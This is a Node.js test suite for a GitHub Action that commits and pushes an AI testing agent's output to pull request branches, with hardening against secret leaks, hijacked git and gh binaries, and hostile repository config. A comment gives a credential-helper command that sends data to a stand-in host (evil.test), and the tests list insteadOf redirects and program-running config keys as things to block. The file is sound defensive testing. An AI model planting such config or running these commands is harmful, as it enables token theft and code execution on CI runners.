import { test, describe } from "node:test"
import assert from "node:assert/strict"
import { execFileSync } from "node:child_process"
import { mkdtempSync, rmSync, readdirSync, readFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
	shouldPushWork,
	changedPaths,
	splitPushable,
	renderPushNote,
	authoredByUs,
	needsCheckout,
	isSameRepo,
	pushCredentialEnv,
	unexpectedConfigKeys,
	agentCommitted,
	CONFIG_READ_ARGS,
	trustedGitPath,
	trustedGhPath,
	ghEnvFrom,
	gitEnvFrom,
	GIT_SAFE_ARGS,
	pushUrlFor,
	BOT_EMAIL,
	handedOffPrRequest,
	commitIdentity,
} from "../src/push-work.mjs"

const live = { preview: false, sameRepo: true, branch: "feat/x", headAuthorEmail: "dev@example.com", onWantedCommit: true }

describe("shouldPushWork — the approved work must survive the runner", () => {
	test("a live run on the pull request's own branch pushes", () => {
		assert.equal(shouldPushWork(live).ok, true)
	})

	test("a preview run never pushes", () => {
		assert.equal(shouldPushWork({ ...live, preview: true }).ok, false)
		assert.match(shouldPushWork({ ...live, preview: true }).why, /preview/i)
	})

	test("a fork's branch is never pushed to", () => {
		assert.equal(shouldPushWork({ ...live, sameRepo: false }).ok, false)
	})

	test("no branch to push to is a no", () => {
		assert.equal(shouldPushWork({ ...live, branch: "" }).ok, false)
	})

	test("a run triggered by our own commit does not push again", () => {
		assert.equal(shouldPushWork({ ...live, headAuthorEmail: BOT_EMAIL }).ok, false)
		assert.match(shouldPushWork({ ...live, headAuthorEmail: BOT_EMAIL }).why, /own commit/i)
	})

	test("the bot email check ignores case and spacing", () => {
		assert.equal(authoredByUs(`  ${BOT_EMAIL.toUpperCase()} `), true)
		assert.equal(authoredByUs("dev@example.com"), false)
		assert.equal(authoredByUs(undefined), false)
	})
})

describe("changedPaths — reading git status", () => {
	test("reads modified, added and untracked paths", () => {
		const porcelain = [" M tests/pricing.spec.js", "A  tests/new.spec.js", "?? tests/extra.spec.js"].join("\n")
		assert.deepEqual(changedPaths(porcelain), ["tests/pricing.spec.js", "tests/new.spec.js", "tests/extra.spec.js"])
	})

	test("a rename reports where the file landed, not where it came from", () => {
		assert.deepEqual(changedPaths("R  old/a.js -> new/a.js"), ["new/a.js"])
	})

	test("a quoted path with a space is unquoted", () => {
		assert.deepEqual(changedPaths('?? "tests/my file.spec.js"'), ["tests/my file.spec.js"])
	})

	test("a deleted file still counts — removing a test is a change worth keeping", () => {
		assert.deepEqual(changedPaths(" D tests/gone.spec.js"), ["tests/gone.spec.js"])
	})

	test("empty status means nothing changed", () => {
		assert.deepEqual(changedPaths(""), [])
		assert.deepEqual(changedPaths("\n  \n"), [])
	})
})

describe("splitPushable — what we refuse to commit", () => {
	test("source and tests are pushable", () => {
		const { push, skip } = splitPushable(["tests/pricing.spec.js", "src/pricing.js", "playwright.config.ts"])
		assert.deepEqual(push, ["tests/pricing.spec.js", "src/pricing.js", "playwright.config.ts"])
		assert.deepEqual(skip, [])
	})

	test("an environment file is never committed", () => {
		const { push, skip } = splitPushable([".env", "tests/a.spec.js", "config/.env.local"])
		assert.deepEqual(push, ["tests/a.spec.js"])
		assert.deepEqual(skip, [".env", "config/.env.local"])
	})

	test("dependencies and run output are never committed", () => {
		const { skip } = splitPushable([
			"node_modules/left-pad/index.js",
			"playwright-report/index.html",
			"test-results/trace.zip",
			"debug.log",
			".testcompanion/logs/run.log",
		])
		assert.equal(skip.length, 5)
	})

	test("a file whose name merely contains a skipped word is kept", () => {
		const { push } = splitPushable(["src/env.js", "tests/node_modules_helper.spec.js"])
		assert.deepEqual(push, ["src/env.js", "tests/node_modules_helper.spec.js"])
	})
})

describe("renderPushNote — the reader must see exactly what landed", () => {
	test("names the branch and every file", () => {
		const note = renderPushNote({ branch: "feat/x", sha: "abc1234", files: ["tests/a.spec.js", "src/b.js"] })
		assert.match(note, /feat\/x/)
		assert.match(note, /abc1234/)
		assert.match(note, /tests\/a\.spec\.js/)
		assert.match(note, /src\/b\.js/)
	})

	test("says what it refused to commit, rather than dropping it silently", () => {
		const note = renderPushNote({ branch: "feat/x", sha: "abc1234", files: ["tests/a.spec.js"], skipped: [".env"] })
		assert.match(note, /\.env/)
	})

	test("a failed push says so instead of claiming the work landed", () => {
		const note = renderPushNote({ branch: "feat/x", files: ["tests/a.spec.js"], error: "permission denied" })
		assert.match(note, /permission denied/)
		assert.doesNotMatch(note, /pushed/i)
	})
})

describe("needsCheckout — the run must happen on the branch it writes to", () => {
	test("a checkout sitting on another commit needs switching", () => {
		assert.equal(needsCheckout({ headSha: "7cab305", wantSha: "54ceef4" }), true)
	})

	test("already on the right commit needs nothing", () => {
		assert.equal(needsCheckout({ headSha: "54ceef4", wantSha: "54ceef4" }), false)
	})

	test("comparison ignores case and short-vs-long form", () => {
		assert.equal(
			needsCheckout({
				headSha: "54CEEF419D7290183E8F6467863D8A92F4E24029",
				wantSha: "54ceef419d7290183e8f6467863d8a92f4e24029",
			}),
			false,
		)
	})

	test("not knowing where we want to be is not a reason to move", () => {
		assert.equal(needsCheckout({ headSha: "7cab305", wantSha: "" }), false)
		assert.equal(needsCheckout({ headSha: "7cab305" }), false)
	})
})

describe("shouldPushWork — the two fail-open holes a review caught", () => {
	test("not knowing whose repository this is refuses the push", () => {
		assert.equal(shouldPushWork({ ...live, sameRepo: undefined }).ok, false)
		assert.equal(shouldPushWork({ ...live, sameRepo: "yes" }).ok, false)
	})

	test("a tree that is not on the wanted commit never pushes", () => {
		assert.equal(shouldPushWork({ ...live, onWantedCommit: false }).ok, false)
		assert.match(shouldPushWork({ ...live, onWantedCommit: false }).why, /commit/i)
	})

	test("not knowing which commit we are on refuses the push", () => {
		assert.equal(shouldPushWork({ ...live, onWantedCommit: undefined }).ok, false)
	})
})

describe("shouldPushWork — never the default branch", () => {
	// The branch name comes from the pull request's own head ref, which its author controls.
	test("a pull request branch is fine", () => {
		assert.equal(shouldPushWork({ ...live, branch: "feat/x", defaultBranch: "main" }).ok, true)
	})

	test("the default branch is refused", () => {
		const r = shouldPushWork({ ...live, branch: "main", defaultBranch: "main" })
		assert.equal(r.ok, false)
		assert.match(r.why, /default branch/i)
	})

	test("the refusal ignores case", () => {
		assert.equal(shouldPushWork({ ...live, branch: "Main", defaultBranch: "main" }).ok, false)
	})

	test("not knowing the default branch does not block an ordinary push", () => {
		assert.equal(shouldPushWork({ ...live, branch: "feat/x" }).ok, true)
	})
})

describe("changedPaths — parsing git status output", () => {
	test("a first line whose leading space was trimmed away still parses", () => {
		assert.deepEqual(changedPaths("M tests/pricing.spec.js"), ["tests/pricing.spec.js"])
	})

	test("the untrimmed form parses identically", () => {
		assert.deepEqual(changedPaths(" M tests/pricing.spec.js"), ["tests/pricing.spec.js"])
	})

	test("a mixed block where only the first line lost its space", () => {
		const corrupted = ["M tests/pricing.spec.js", " M src/pricing.js", "?? tests/new.spec.js"].join("\n")
		assert.deepEqual(changedPaths(corrupted), ["tests/pricing.spec.js", "src/pricing.js", "tests/new.spec.js"])
	})

	test("every two-letter status code is handled", () => {
		for (const code of ["MM", "A ", " A", "AM", "RM", "??", "UU", " D", "D "]) {
			assert.deepEqual(changedPaths(`${code} some/file.js`), ["some/file.js"], `status ${JSON.stringify(code)}`)
		}
	})

	test("a path that itself begins with a space survives, because it is quoted", () => {
		assert.deepEqual(changedPaths('?? " leading.spec.js"'), [" leading.spec.js"])
	})
})

describe("isSameRepo — whose branch is this, really", () => {
	test("the same repository, compared case-insensitively", () => {
		assert.equal(isSameRepo("Acme/Shop", "acme/shop"), true)
		assert.equal(isSameRepo("acme/shop", "acme/shop"), true)
	})

	test("a fork is not this repository", () => {
		assert.equal(isSameRepo("someone/shop", "acme/shop"), false)
	})

	test("not knowing is a refusal, never an assumption", () => {
		assert.equal(isSameRepo(undefined, "acme/shop"), undefined)
		assert.equal(isSameRepo("", "acme/shop"), undefined)
		assert.equal(isSameRepo("acme/shop", ""), undefined)
	})
})

describe("changedPaths — paths git had to escape", () => {
	test("an octal-escaped non-ASCII path is decoded back to its real name", () => {
		assert.deepEqual(changedPaths('?? "caf\\303\\251.spec.ts"'), ["café.spec.ts"])
	})

	test("a quoted path with a space still works — the case that used to pass", () => {
		assert.deepEqual(changedPaths('?? "my file.spec.js"'), ["my file.spec.js"])
	})

	test("escaped quotes and backslashes come back as themselves", () => {
		assert.deepEqual(changedPaths('?? "say \\"hi\\".spec.js"'), ['say "hi".spec.js'])
		assert.deepEqual(changedPaths('?? "back\\\\slash.spec.js"'), ["back\\slash.spec.js"])
	})

	test("an unquoted path is left exactly as it is", () => {
		assert.deepEqual(changedPaths("?? plain.spec.js"), ["plain.spec.js"])
		assert.deepEqual(changedPaths("?? caf\u00e9.spec.ts"), ["café.spec.ts"])
	})

	test("a rename to an escaped path reports the decoded destination", () => {
		assert.deepEqual(changedPaths('R  old.js -> "caf\\303\\251.spec.ts"'), ["café.spec.ts"])
	})
})

describe("changedPaths — characters outside the basic plane", () => {
	test("an emoji in a quoted path survives", () => {
		assert.deepEqual(changedPaths('?? "my 🎉 file.spec.ts"'), ["my 🎉 file.spec.ts"])
	})

	test("an emoji that git DID escape also survives", () => {
		// 🎉 is f0 9f 8e 89.
		assert.deepEqual(changedPaths('?? "p\\360\\237\\216\\211q.spec.ts"'), ["p🎉q.spec.ts"])
	})

	test("mixed astral, accented and plain in one path", () => {
		assert.deepEqual(changedPaths('?? "caf\u00e9 🎉 ok.spec.ts"'), ["café 🎉 ok.spec.ts"])
	})
})

describe("the App token has to reach git, not just gh", () => {
	const URL = "https://github.com/acme/shop.git"

	test("builds a basic auth header SCOPED to the push url", () => {
		const got = pushCredentialEnv("ghs_abc123", URL)
		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
		const b64 = got.GIT_CONFIG_VALUE_0.split("basic ")[1]
		assert.equal(Buffer.from(b64, "base64").toString("utf8"), "x-access-token:ghs_abc123")
	})

	test("the header is never global", () => {
		const got = pushCredentialEnv("ghs_abc123", URL)
		assert.notEqual(got.GIT_CONFIG_KEY_0, "http.extraheader")
		assert.match(got.GIT_CONFIG_KEY_0, /^http\.https:\/\/github\.com\/acme\/shop\.git\.extraheader$/)
	})

	test("no token, or no url, means no credential", () => {
		assert.deepEqual(pushCredentialEnv(undefined, URL), {})
		assert.deepEqual(pushCredentialEnv("", URL), {})
		assert.deepEqual(pushCredentialEnv("ghs_abc123", ""), {})
		assert.deepEqual(pushCredentialEnv("ghs_abc123", undefined), {})
	})

	test("the token itself is never passed in the clear", () => {
		const got = pushCredentialEnv("ghs_secret", URL)
		assert.ok(
			!Object.values(got).some((v) => v.includes("ghs_secret")),
			`the raw token appeared in ${JSON.stringify(got)}`,
		)
	})

	test("the push url comes from the repository NAME, not from git config", () => {
		assert.equal(pushUrlFor("acme/shop"), "https://github.com/acme/shop.git")
		assert.equal(pushUrlFor("acme/shop", "https://ghe.corp/"), "https://ghe.corp/acme/shop.git")
	})

	test("a repository name we cannot read gives no url, so no push", () => {
		for (const bad of ["", "   ", "acme", "acme/shop/extra", undefined, "acme shop"]) {
			assert.equal(pushUrlFor(bad), undefined, `accepted ${JSON.stringify(bad)}`)
		}
	})
})

describe("our own git commands must not carry secrets or run hooks", () => {
	// These commands run after the agent, which could write to the working tree.
	const dirty = {
		PATH: "/usr/bin",
		HOME: "/home/runner",
		HTTPS_PROXY: "http://proxy:8080",
		TC_ACTION_APP_PRIVATE_KEY: "-----BEGIN PRIVATE KEY-----",
		TC_ACTION_APP_ID: "12345",
		GH_TOKEN: "ghs_secret",
		BROWSERSTACK_ACCESS_KEY: "bs_secret",
		GITHUB_TOKEN: "ghp_secret",
	}

	test("no secret survives", () => {
		const got = gitEnvFrom(dirty)
		for (const k of [
			"TC_ACTION_APP_PRIVATE_KEY",
			"TC_ACTION_APP_ID",
			"GH_TOKEN",
			"BROWSERSTACK_ACCESS_KEY",
			"GITHUB_TOKEN",
		]) {
			assert.equal(got[k], undefined, `${k} reached git`)
		}
		assert.ok(!JSON.stringify(got).includes("secret"), `a secret value leaked: ${JSON.stringify(got)}`)
	})

	test("what git actually needs survives", () => {
		const got = gitEnvFrom(dirty)
		// PATH is pinned rather than inherited — see the hijack test below.
		assert.equal(got.PATH, "/usr/bin:/bin")
		assert.equal(got.HOME, "/home/runner")
		assert.equal(got.HTTPS_PROXY, "http://proxy:8080", "a push has to reach the network")
	})

	test("an empty environment still disables the system and user config", () => {
		for (const got of [gitEnvFrom({}), gitEnvFrom()]) {
			assert.equal(got.GIT_CONFIG_NOSYSTEM, "1")
			assert.equal(got.GIT_CONFIG_GLOBAL, "/dev/null")
			assert.equal(got.GIT_TERMINAL_PROMPT, "0")
			assert.equal(got.GIT_ASKPASS, "")
			assert.equal(got.SSH_ASKPASS, "")
			assert.equal(got.GIT_ATTR_NOSYSTEM, "1")
			// Nothing was inherited: every key is one we set deliberately.
			assert.ok(Object.keys(got).every((k) => k.startsWith("GIT_") || k === "SSH_ASKPASS" || k === "PATH"))
		}
	})

	test("every exec-capable config key is pinned shut", () => {
		const settings = GIT_SAFE_ARGS.filter((a) => a !== "-c")
		for (const key of [
			"core.hooksPath=/dev/null",
			"core.fsmonitor=false",
			"core.sshCommand=",
			"core.pager=cat",
			"diff.external=",
			"commit.gpgsign=false",
			"gpg.program=false",
			"core.attributesFile=/dev/null",
			"credential.helper=",
			"core.askPass=",
			"protocol.allow=never",
			"protocol.https.allow=always",
			"http.proxy=",
			"core.gitProxy=",
		]) {
			assert.ok(settings.includes(key), `${key} is not pinned: ${JSON.stringify(settings)}`)
		}
	})

	test("they are passed as -c pairs, so git reads them as config", () => {
		assert.equal(GIT_SAFE_ARGS.length % 2, 0)
		for (let i = 0; i < GIT_SAFE_ARGS.length; i += 2) {
			assert.equal(GIT_SAFE_ARGS[i], "-c")
		}
	})
})

describe("the repository's own git config must not steer the push", () => {
	test("a redirect is refused — insteadOf rewrites even an explicit URL", () => {
		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.insteadOf\ncore.bare"), [
			"url.https://evil.test/.insteadOf",
		])
		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.pushInsteadOf"), [
			"url.https://evil.test/.pushInsteadOf",
		])
	})

	test("a credential helper is refused — git runs it as a shell command", () => {
		// `credential.helper=!curl evil.test -d` executes on the first 401.
		assert.deepEqual(unexpectedConfigKeys("credential.helper"), ["credential.helper"])
	})

	test("the keys that run a program are refused", () => {
		for (const key of [
			"core.sshCommand",
			"core.gitProxy",
			"core.hooksPath",
			"core.fsmonitor",
			"core.pager",
			"core.askPass",
			"filter.lfs.clean",
			"filter.evil.process",
			"diff.external",
			"diff.evil.textconv",
			"gpg.program",
			"uploadpack.packObjectsHook",
			"sequence.editor",
			"pager.diff",
			"protocol.ext.allow",
			"remote.origin.uploadpack",
			"http.proxy",
			"include.path",
			"includeIf.gitdir:/x.path",
		]) {
			assert.deepEqual(unexpectedConfigKeys(key), [key], `${key} must be refused`)
		}
	})

	test("case does not matter — git lowercases section and key names", () => {
		assert.deepEqual(unexpectedConfigKeys("CREDENTIAL.HELPER"), ["CREDENTIAL.HELPER"])
		assert.deepEqual(unexpectedConfigKeys("CORE.FILEMODE"), [])
	})

	test("a key we have never heard of is refused by default", () => {
		assert.deepEqual(unexpectedConfigKeys("some.future.hook"), ["some.future.hook"])
		assert.deepEqual(unexpectedConfigKeys("http.sslVerify"), ["http.sslVerify"])
		assert.deepEqual(unexpectedConfigKeys("http.curloptResolve"), ["http.curloptResolve"])
		assert.deepEqual(unexpectedConfigKeys("core.worktree"), ["core.worktree"])
		assert.deepEqual(unexpectedConfigKeys("extensions.worktreeConfig"), ["extensions.worktreeConfig"])
	})

	test("a bare http.extraheader is refused; only a scoped one is expected", () => {
		assert.deepEqual(unexpectedConfigKeys("http.extraheader"), ["http.extraheader"])
		assert.deepEqual(unexpectedConfigKeys("http.https://github.com/.extraheader"), [])
	})

	test("an ordinary checkout is NOT refused", () => {
		const afterCheckout = [
			"core.repositoryformatversion",
			"core.filemode",
			"core.bare",
			"core.logallrefupdates",
			"remote.origin.url",
			"remote.origin.fetch",
			"http.https://github.com/.extraheader",
			"branch.main.remote",
			"branch.main.merge",
			"user.name",
			"user.email",
			"gc.auto",
		].join("\n")
		assert.deepEqual(unexpectedConfigKeys(afterCheckout), [])
	})

	test("nothing in, nothing out", () => {
		for (const empty of ["", "   ", undefined, null]) assert.deepEqual(unexpectedConfigKeys(empty), [])
	})
})

describe("the credential travels in the environment, not in argv", () => {
	test("it is a scoped extraheader delivered through GIT_CONFIG_*", () => {
		const got = pushCredentialEnv("ghs_secret", "https://github.com/acme/shop.git")
		assert.equal(got.GIT_CONFIG_COUNT, "1")
		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
		assert.equal(got.GIT_CONFIG_VALUE_0, `AUTHORIZATION: basic ${Buffer.from("x-access-token:ghs_secret").toString("base64")}`)
	})

	test("anyone running `ps` sees no token", () => {
		// argv is world-readable on the runner; /proc/<pid>/environ is not.
		const argv = ["push", "https://github.com/acme/shop.git", "HEAD:refs/heads/x"]
		assert.ok(!argv.join(" ").includes("ghs_secret"))
	})

	test("no token or no URL means no credential at all, never a half-formed one", () => {
		assert.deepEqual(pushCredentialEnv("", "https://github.com/a/b.git"), {})
		assert.deepEqual(pushCredentialEnv("ghs_x", ""), {})
		assert.deepEqual(pushCredentialEnv(undefined, undefined), {})
	})
})

describe("git itself must be the real git", () => {
	const exists = (p) => ["/usr/bin/git", "/bin/git"].includes(p)
	const notWritable = () => false

	test("an absolute, root-owned path is used, never a bare name", () => {
		assert.equal(trustedGitPath({ exists, canWrite: notWritable }), "/usr/bin/git")
	})

	test("a candidate WE can write is not trusted — that is the hijack", () => {
		const canWriteUsrBin = (p) => p === "/usr/bin/git"
		assert.equal(trustedGitPath({ exists, canWrite: canWriteUsrBin }), "/bin/git")
	})

	test("nothing trustworthy means nothing, not a fallback to PATH", () => {
		assert.equal(trustedGitPath({ exists: () => false, canWrite: notWritable }), undefined)
		assert.equal(trustedGitPath({ exists, canWrite: () => true }), undefined)
	})

	test("PATH is pinned, not inherited — a planted directory cannot come along", () => {
		const got = gitEnvFrom({ PATH: "/home/runner/.local/bin:/usr/bin" })
		assert.equal(got.PATH, "/usr/bin:/bin")
	})
})

// Every gh call we make carries a token, the App's included.
describe("gh itself must be the real gh, with settings nobody planted", () => {
	const notWritable = () => false

	test("a system gh is used, never a bare name", () => {
		const exists = (p) => p === "/usr/bin/gh"
		assert.equal(trustedGhPath({ exists, canWrite: notWritable }), "/usr/bin/gh")
	})

	test("the agent's own bin folder is never a candidate", () => {
		// Even if a gh there looked read-only, it is not where we look.
		const exists = (p) => p.endsWith("/.local/bin/gh")
		assert.equal(trustedGhPath({ exists, canWrite: notWritable }), undefined)
	})

	test("a gh we can write is skipped for the next one", () => {
		const exists = (p) => ["/usr/local/bin/gh", "/opt/homebrew/bin/gh"].includes(p)
		const canWrite = (p) => p === "/usr/local/bin/gh"
		assert.equal(trustedGhPath({ exists, canWrite }), "/opt/homebrew/bin/gh")
	})

	test("nothing trustworthy means nothing, not a fallback to PATH", () => {
		assert.equal(trustedGhPath({ exists: () => false, canWrite: notWritable }), undefined)
		assert.equal(trustedGhPath({ exists: () => true, canWrite: () => true }), undefined)
	})

	test("our settings folder replaces the shared one the agent can write", () => {
		const got = ghEnvFrom(
			{ GH_CONFIG_DIR: "/runner/_temp/tc-gh-config", GH_TOKEN: "workflow-token", PATH: "/usr/bin" },
			{ token: "app-token", configDir: "/runner/_temp/tc-gh-call-abc" },
		)
		assert.equal(got.GH_CONFIG_DIR, "/runner/_temp/tc-gh-call-abc")
		assert.equal(got.GH_TOKEN, "app-token")
		assert.equal(got.GH_NO_UPDATE_NOTIFIER, "1")
		assert.equal(got.GH_PROMPT_DISABLED, "1")
	})

	test("no source file starts gh by its bare name", () => {
		const src = new URL("../src/", import.meta.url).pathname
		for (const f of readdirSync(src).filter((n) => n.endsWith(".mjs"))) {
			const code = readFileSync(join(src, f), "utf8")
				.split("\n")
				.filter((l) => !/^\s*(\*|\/\/)/.test(l))
				.join("\n")
			assert.doesNotMatch(code, /spawn(Sync)?\(\s*["']gh["']/, `${f} runs gh by name`)
			assert.doesNotMatch(code, /exec(File)?(Sync)?\(\s*["']gh["']/, `${f} runs gh by name`)
		}
	})
})

describe("the config check reads the repository, not our own flags", () => {
	test("-c values do not come back as unexpected keys", () => {
		const dir = mkdtempSync(join(tmpdir(), "tc-config-"))
		try {
			execFileSync("git", ["init", "-q", dir])
			const listing = execFileSync(
				"git",
				[...GIT_SAFE_ARGS, "-C", dir, ...CONFIG_READ_ARGS],
				{ encoding: "utf8", env: gitEnvFrom({}) },
			)
			assert.deepEqual(
				unexpectedConfigKeys(listing),
				[],
				"a freshly initialised repository must be acceptable, with our own -c flags in play",
			)
		} finally {
			rmSync(dir, { recursive: true, force: true })
		}
	})
})

describe("the push carries the run's test files and nothing else", () => {
	test("a new directory must arrive as its files, not as one entry", () => {
		const collapsed = changedPaths("?? tests/\n")
		assert.deepEqual(collapsed, ["tests/"], "this is what the old command produced")
		const { push } = splitPushable(collapsed)
		assert.deepEqual(push, ["tests/"], "and the deny list cannot see inside it")

		// With -uall the same tree arrives file by file, so the deny list works.
		const expanded = changedPaths("?? tests/login.spec.ts\n?? tests/.env\n?? tests/run.log\n")
		const split = splitPushable(expanded)
		assert.deepEqual(split.push, ["tests/login.spec.ts"])
		assert.ok(split.skip.includes("tests/.env"), "a secret must never be committed")
	})

	test("a commit the agent made itself is not ours to push", () => {
		assert.equal(agentCommitted("aaa111", "bbb222"), true)
		assert.equal(agentCommitted("aaa111", "aaa111"), false)
	})

	test("not knowing where HEAD was is not permission to push", () => {
		assert.equal(agentCommitted(undefined, "bbb222"), true, "unknown must fail closed")
		assert.equal(agentCommitted("", "bbb222"), true)
	})
})

// `.github/` tells GitHub what to run, and a symlink can point anywhere on the runner.
describe("splitPushable refuses .github and symlinks", () => {
	test("anything under .github is skipped", () => {
		const { push, skip } = splitPushable([
			".github/actions/setup/action.yml",
			".github/CODEOWNERS",
			".github/workflows/ci.yml",
			"packages/web/.GitHub/x.yml",
			"tests/login.spec.ts",
		])
		assert.deepEqual(push, ["tests/login.spec.ts"])
		assert.equal(skip.length, 4)
	})

	test("a file merely named like it is kept", () => {
		const { push } = splitPushable(["tests/github.spec.ts", "src/.githubrc.test.ts"])
		assert.deepEqual(push, ["tests/github.spec.ts", "src/.githubrc.test.ts"])
	})

	test("a symlink is skipped", () => {
		const isSymlink = (p) => p === "tests/fixtures/link"
		const { push, skip } = splitPushable(["tests/fixtures/link", "tests/a.spec.ts"], { isSymlink })
		assert.deepEqual(push, ["tests/a.spec.ts"])
		assert.deepEqual(skip, ["tests/fixtures/link"])
	})
})

describe("jobs that don't produce code never push", () => {
	const live = { preview: false, sameRepo: true, branch: "feature/x", onWantedCommit: true, defaultBranch: "main" }

	for (const workflow of ["generate", "rca", "verdict", "validate"]) {
		test(`${workflow} saves nothing to the branch`, () => {
			const out = shouldPushWork({ ...live, workflow })
			assert.equal(out.ok, false)
			assert.match(out.why, /does not change code/)
		})
	}

	test("a job that writes code still may", () => {
		assert.equal(shouldPushWork({ ...live, workflow: "test-pr" }).ok, true)
		assert.equal(shouldPushWork({ ...live, workflow: "fix" }).ok, true)
	})
})

describe("BrowserStack tooling's by-products are never committed", () => {
	test("browserstack.err and .browserstack files are skipped", () => {
		const { push, skip } = splitPushable(["browserstack.err", ".browserstack-local.json", "src/a.test.ts", "nested/browserstack.err"])
		assert.deepEqual(push, ["src/a.test.ts"])
		assert.deepEqual(skip, ["browserstack.err", ".browserstack-local.json", "nested/browserstack.err"])
	})
})

describe("handedOffPrRequest — a fix asked for on a pull request targets that pull request", () => {
	const req = { branch: "tc/fix/abc", base: "main", title: "tc fix: abc", body: "What changed." }

	test("on a pull request: base is its branch, a draft, a title that names it", () => {
		const out = handedOffPrRequest({ req, workflow: "fix", pr: "42", prBranch: "feat/cart", defaultBranch: "main" })
		assert.equal(out.base, "feat/cart")
		assert.equal(out.head, "tc/fix/abc")
		assert.equal(out.draft, true)
		assert.equal(out.title, "Test Companion fix for #42")
		assert.match(out.body, /Requested on #42\./)
	})

	test("without a pull request: the default branch, the CLI's own title", () => {
		const out = handedOffPrRequest({ req, workflow: "fix", defaultBranch: "main" })
		assert.equal(out.base, "main")
		assert.equal(out.title, "tc fix: abc")
		assert.equal(out.draft, true)
	})

	test("no default branch known: the CLI's base", () => {
		assert.equal(handedOffPrRequest({ req, workflow: "automate" }).base, "main")
	})
})

describe("commitIdentity — commits are credited to the App when acting as it", () => {
	test("the App's bot account, with the noreply email GitHub links to it", () => {
		assert.deepEqual(commitIdentity({ appSlug: "browserstack", appUserId: "355331011" }), {
			name: "browserstack[bot]",
			email: "355331011+browserstack[bot]@users.noreply.github.com",
		})
	})

	test("without the App, or without its id, the fixed identity", () => {
		assert.deepEqual(commitIdentity(), { name: "Test Companion", email: BOT_EMAIL })
		assert.deepEqual(commitIdentity({ appSlug: "browserstack", appUserId: "" }), { name: "Test Companion", email: BOT_EMAIL })
		assert.deepEqual(commitIdentity({ appSlug: "browserstack", appUserId: "not-a-number" }), { name: "Test Companion", email: BOT_EMAIL })
	})

	test("the loop guard knows the App's commits are ours too", () => {
		const app = "355331011+browserstack[bot]@users.noreply.github.com"
		assert.equal(authoredByUs(app, [app]), true)
		assert.equal(authoredByUs(BOT_EMAIL), true)
		assert.equal(authoredByUs("dev@example.com", [app]), false)
		assert.equal(authoredByUs("", [""]), false)
	})
})
